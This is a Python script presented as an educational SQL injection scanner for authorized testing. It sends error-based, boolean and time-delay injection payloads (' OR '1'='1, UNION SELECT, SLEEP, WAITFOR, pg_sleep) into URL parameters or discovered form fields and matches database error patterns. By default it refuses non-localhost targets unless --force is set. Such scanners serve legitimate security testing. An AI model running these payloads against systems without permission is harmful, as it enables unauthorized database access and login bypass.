#!/usr/bin/env python3
"""
sqli_tester_adv.py - Educational SQL injection tester for AUTHORIZED testing only.

Usage examples:
  python sqli_tester_adv.py --url "http://127.0.0.1:8000/search" --param "q"
  python sqli_tester_adv.py --url "http://127.0.0.1:8000/login" --discover-forms
  python sqli_tester_adv.py --url "https://example.com/search" --param "q" --force

WARNING: Only use against systems you own or have explicit written permission to test.
"""

import argparse
import csv
import re
import time
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

# ------------------------------
# Configuration / payloads
# ------------------------------
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"valid MySQL result",
    r"MySqlException",
    r"SQLException",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"PG::SyntaxError",
    r"syntax error at or near",  # Postgres
]
ERROR_RE = re.compile("|".join(SQL_ERROR_PATTERNS), re.IGNORECASE)

# Generic payloads
PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 -- ",
    "\" OR \"1\"=\"1",
    "'; -- ",
    "' UNION SELECT NULL-- ",
    "' AND 1=0 UNION SELECT 1,2,3 -- ",
]

# Boolean payloads: one that should be true and one false
BOOLEAN_TRUE = "' OR '1'='1"
BOOLEAN_FALSE = "' OR '1'='2"

# Timing payloads (may be DB-specific)
TIMING_PAYLOADS = [
    ("MySQL", "' OR SLEEP(5) -- "),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5' -- "),
    ("Postgres", "'; SELECT pg_sleep(5); -- "),
]

DEFAULT_TIMEOUT = 15
CSV_OUTPUT = "sqli_results.csv"

# ------------------------------
# Helpers
# ------------------------------
def looks_like_localhost(url):
    host = urlparse(url).hostname or ""
    return host in ("127.0.0.1", "localhost", "::1")

def find_forms(html, base_url):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action")
        method = form.get("method", "get").lower()
        inputs = {}
        for inp in form.find_all(["input", "textarea", "select"]):
            name = inp.get("name")
            if not name:
                continue
            value = inp.get("value", "")
            inputs[name] = value
        forms.append({
            "action": urljoin(base_url, action) if action else base_url,
            "method": method,
            "inputs": inputs
        })
    return forms

def send_request(session, url, method, params=None, data=None, timeout=DEFAULT_TIMEOUT):
    try:
        if method == "post":
            return session.post(url, data=data, timeout=timeout, allow_redirects=True)
        else:
            return session.get(url, params=params, timeout=timeout, allow_redirects=True)
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def check_error_in_response(text):
    if not text:
        return False
    return bool(ERROR_RE.search(text))

# ------------------------------
# Core tests
# ------------------------------
def test_error_based(session, target_url, method, param_name, base_params, timeout):
    findings = []
    for payload in PAYLOADS:
        if method == "post":
            data = base_params.copy()
            data[param_name] = payload
            r = send_request(session, target_url, "post", data=data, timeout=timeout)
        else:
            params = base_params.copy()
            params[param_name] = payload
            r = send_request(session, target_url, "get", params=params, timeout=timeout)

        if not r:
            continue
        if check_error_in_response(r.text):
            findings.append(("error", payload, r.status_code, "SQL error message present"))
        else:
            findings.append(("noerror", payload, r.status_code, None))
    return findings

def test_boolean_based(session, target_url, method, param_name, base_params, timeout):
    # Get baseline for comparison
    if method == "post":
        data = base_params.copy(); data[param_name] = "normalvalue"
        r_base = send_request(session, target_url, "post", data=data, timeout=timeout)
    else:
        params = base_params.copy(); params[param_name] = "normalvalue"
        r_base = send_request(session, target_url, "get", params=params, timeout=timeout)

    base_text = r_base.text if r_base else ""
    findings = []
    for true_p, false_p in [(BOOLEAN_TRUE, BOOLEAN_FALSE)]:
        if method == "post":
            tdata = base_params.copy(); tdata[param_name] = true_p
            fdata = base_params.copy(); fdata[param_name] = false_p
            rt = send_request(session, target_url, "post", data=tdata, timeout=timeout)
            rf = send_request(session, target_url, "post", data=fdata, timeout=timeout)
        else:
            tparams = base_params.copy(); tparams[param_name] = true_p
            fparams = base_params.copy(); fparams[param_name] = false_p
            rt = send_request(session, target_url, "get", params=tparams, timeout=timeout)
            rf = send_request(session, target_url, "get", params=fparams, timeout=timeout)

        txt_t = rt.text if rt else ""
        txt_f = rf.text if rf else ""
        # crude comparison: when true vs false yield visibly different bodies, it may indicate boolean SQLi
        if txt_t != txt_f:
            findings.append(("boolean", f"{true_p} / {false_p}", (rt.status_code if rt else None, rf.status_code if rf else None), "Response difference between true/false payloads"))
        else:
            findings.append(("noboolean", f"{true_p} / {false_p}", None, "No observable difference"))
    return findings

def test_timing_based(session, target_url, method, param_name, base_params, timeout, baseline=None):
    results = []
    if baseline is None:
        # measure baseline
        if method == "post":
            data = base_params.copy(); data[param_name] = "baseline_test"
            start = time.time(); send_request(session, target_url, "post", data=data, timeout=timeout); baseline = time.time() - start
        else:
            params = base_params.copy(); params[param_name] = "baseline_test"
            start = time.time(); send_request(session, target_url, "get", params=params, timeout=timeout); baseline = time.time() - start

    for dbname, payload in TIMING_PAYLOADS:
        if method == "post":
            data = base_params.copy(); data[param_name] = payload
            start = time.time(); send_request(session, target_url, "post", data=data, timeout=timeout+10); elapsed = time.time() - start
        else:
            params = base_params.copy(); params[param_name] = payload
            start = time.time(); send_request(session, target_url, "get", params=params, timeout=timeout+10); elapsed = time.time() - start

        if elapsed - baseline > 3.0:
            results.append(("timing", payload, elapsed, f"Timing anomaly vs baseline {baseline:.2f}s; db guessed {dbname}"))
        else:
            results.append(("notiming", payload, elapsed, None))
    return baseline, results

# ------------------------------
# Runner and CLI
# ------------------------------
def run_tests(args):
    if not looks_like_localhost(args.url) and not args.force:
        print("REFUSAL: Target is not localhost. To proceed anyway re-run with --force ONLY if you have explicit permission to test the target.")
        return

    session = requests.Session()
    # Optionally set headers/cookies if provided
    if args.user_agent:
        session.headers.update({"User-Agent": args.user_agent})
    if args.cookie:
        # cookie string like "name=value; name2=value2"
        cookies = {}
        for kv in args.cookie.split(";"):
            if "=" in kv:
                k, v = kv.strip().split("=", 1)
                cookies[k] = v
        session.cookies.update(cookies)

    print(f"[+] Target: {args.url}")
    base_params = {}
    method = "get"
    target_url = args.url

    # Discover forms if requested
    if args.discover_forms:
        print("[*] Fetching page to discover forms...")
        r = session.get(args.url, timeout=DEFAULT_TIMEOUT)
        if not r:
            print("Failed to fetch page for form discovery.")
        else:
            forms = find_forms(r.text, args.url)
            if not forms:
                print("No forms discovered on the page.")
            else:
                print(f"Discovered {len(forms)} form(s). Will test first form and any named parameters unless overridden.")
                form = forms[0]
                target_url = form["action"]
                method = form["method"]
                base_params = form["inputs"].copy()
                # blank out values to avoid accidental submission of meaningful defaults
                for k in base_params:
                    base_params[k] = ""
                print(f"[i] Form action: {target_url} method: {method} params: {list(base_params.keys())}")

    # If user supplied a parameter, use that
    if args.param:
        param_names = [p.strip() for p in args.param.split(",")]
    else:
        # if we have base_params from form discovery, use them
        param_names = list(base_params.keys()) if base_params else []
        if not param_names:
            print("No parameters specified and none discovered. Provide --param or use --discover-forms.")
            return

    all_findings = []

    # For each parameter, run tests
    for pname in param_names:
        print(f"\n=== Testing parameter: {pname} ===")
        # ensure param exists in base_params
        params_copy = base_params.copy()
        if pname not in params_copy:
            params_copy[pname] = ""

        # Error-based
        print("[*] Running error-based payloads...")
        err_find = test_error_based(session, target_url, method, pname, params_copy, args.timeout)
        for r in err_find:
            status = r[2]
            if r[0] == "error":
                print(f"[!] Possible error-based SQLi: payload={r[1]!r} status={status} note={r[3]}")
                all_findings.append({"param": pname, "type": "error", "payload": r[1], "status": status, "notes": r[3]})
            else:
                print(f"[-] payload={r[1]!r} status={status}")

        # Boolean-based
        print("[*] Running boolean-based check...")
        bool_find = test_boolean_based(session, target_url, method, pname, params_copy, args.timeout)
        for b in bool_find:
            if b[0] == "boolean":
                print(f"[!] Possible boolean-based SQLi: payloads={b[1]} note={b[3]}")
                all_findings.append({"param": pname, "type": "boolean", "payload": b[1], "notes": b[3]})
            else:
                print(f"[-] No boolean indication: {b[1]}")

        # Timing-based
        print("[*] Running timing-based checks (this will take some time)...")
        baseline, timing_find = test_timing_based(session, target_url, method, pname, params_copy, args.timeout)
        print(f"[i] Baseline: {baseline:.2f}s")
        for t in timing_find:
            if t[0] == "timing":
                print(f"[!] Timing-based anomaly: payload={t[1]!r} elapsed={t[2]:.2f}s notes={t[3]}")
                all_findings.append({"param": pname, "type": "timing", "payload": t[1], "elapsed": t[2], "notes": t[3]})
            else:
                print(f"[-] No timing anomaly for payload {t[1]!r} (elapsed {t[2]:.2f}s)")

    # Write CSV
    if all_findings:
        print(f"\n[+] Writing findings to {CSV_OUTPUT}")
        keys = set()
        for f in all_findings:
            keys.update(f.keys())
        keys = list(keys)
        with open(CSV_OUTPUT, "w", newline="", encoding="utf-8") as csvfile:
            writer = csv.DictWriter(csvfile, fieldnames=keys)
            writer.writeheader()
            for f in all_findings:
                writer.writerow(f)
    else:
        print("\n[-] No obvious vulnerabilities detected by these basic checks.")

    print("\n[+] Scan finished. This is a basic educational scanner — for professional testing use sqlmap, Burp Suite, or OWASP ZAP and follow a proper authorization / scope document.")

# ------------------------------
# CLI
# ------------------------------
def parse_args():
    p = argparse.ArgumentParser(description="Educational SQLi tester for authorized testing")
    p.add_argument("--url", required=True, help="Target URL to test")
    p.add_argument("--param", help="Parameter name(s) to test (comma separated). If omitted and --discover-forms used, will use discovered form params.")
    p.add_argument("--discover-forms", action="store_true", help="Fetch the page and try to discover forms and their inputs")
    p.add_argument("--force", action="store_true", help="Allow non-localhost targets (only use with explicit permission)")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
    p.add_argument("--user-agent", help="Optional user agent string to set")
    p.add_argument("--cookie", help="Optional cookie string to include (e.g. 'SESSION=abc; foo=bar')")
    return p.parse_args()

if __name__ == "__main__":
    args = parse_args()
    run_tests(args)
